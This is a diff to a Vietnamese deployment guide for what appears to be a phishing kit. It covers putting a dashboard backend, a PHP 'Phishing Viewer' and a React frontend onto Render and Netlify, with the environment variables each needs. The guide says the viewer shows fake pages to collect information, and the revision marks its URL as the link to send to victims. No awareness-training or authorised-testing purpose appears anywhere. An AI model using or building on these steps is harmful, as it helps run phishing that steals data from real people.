@@ -10,23 +10,25 @@ Tài liệu này hướng dẫn chi tiết cách triển khai hệ thống Webke
 
 ## 2. Deploy Backend (Render)
 
-Hệ thống Backend bao gồm 2 service chính:
-1. **Dashboard Backend**: API chính quản lý user, templates, admin.
-2. **Phishing Viewer**: Server hiển thị trang fake để thu thập thông tin.
+Hệ thống Backend bao gồm 2 service chính được định nghĩa trong `dashboard/render.yaml`:
+1. **Dashboard Backend**: API chính quản lý user, templates, admin (Node.js).
+2. **Phishing Viewer PHP**: Server hiển thị trang fake và giao diện người dùng (PHP/Docker).
 
 ### Các bước thực hiện:
 1. Đăng nhập vào Render Dashboard.
 2. Chọn **Blueprints** -> **New Blueprint Instance**.
 3. Kết nối với GitHub Repository của bạn.
-4. Render sẽ tự động phát hiện file `render.yaml`.
+4. Render sẽ tự động phát hiện file `dashboard/render.yaml`.
 5. Điền các biến môi trường (Environment Variables) khi được yêu cầu:
-   - `DATABASE_URL`: Connection string của Neon DB.
+   - `DATABASE_URL`: Connection string của Neon DB (PostgreSQL).
    - `JWT_SECRET`: Chuỗi bí mật cho token.
    - `PUSHER_APP_ID`, `PUSHER_KEY`, `PUSHER_SECRET`, `PUSHER_CLUSTER`: Thông tin từ Pusher.
 
 ### Kiểm tra sau khi deploy:
-- Dashboard Backend URL: `https://dashboard-backend.onrender.com`
-- Phishing Viewer URL: `https://phishing-viewer.onrender.com`
+- **Dashboard Backend URL**: `https://dashboard-backend.onrender.com` (Dùng cho API)
+- **Phishing Viewer URL**: `https://phishing-viewer-php.onrender.com` (Dùng để gửi link cho nạn nhân)
+
+> **Lưu ý**: Service `phishing-viewer-php` sử dụng Docker. Quá trình build lần đầu có thể mất vài phút.
 
 ## 3. Deploy Frontend (Netlify)
 
@@ -41,8 +43,8 @@ Frontend là ứng dụng React (Vite) sẽ kết nối tới Backend trên Rend
    - **Build command**: `npm run build`
    - **Publish directory**: `dist`
 5. Thêm Environment Variables trong phần **Site settings** -> **Environment variables**:
-   - `VITE_API_URL`: `https://dashboard-backend.onrender.com` (URL Backend vừa deploy)
-   - `VITE_PHISHING_VIEWER_URL`: `https://phishing-viewer.onrender.com`
+   - `VITE_API_URL`: `https://dashboard-backend.onrender.com` (URL Backend Node.js)
+   - `VITE_PHISHING_VIEWER_URL`: `https://phishing-viewer-php.onrender.com` (URL Phishing Viewer PHP)
 
 ### Lưu ý về `netlify.toml`:
 File `netlify.toml` trong thư mục `dashboard` đã được cấu hình sẵn để:
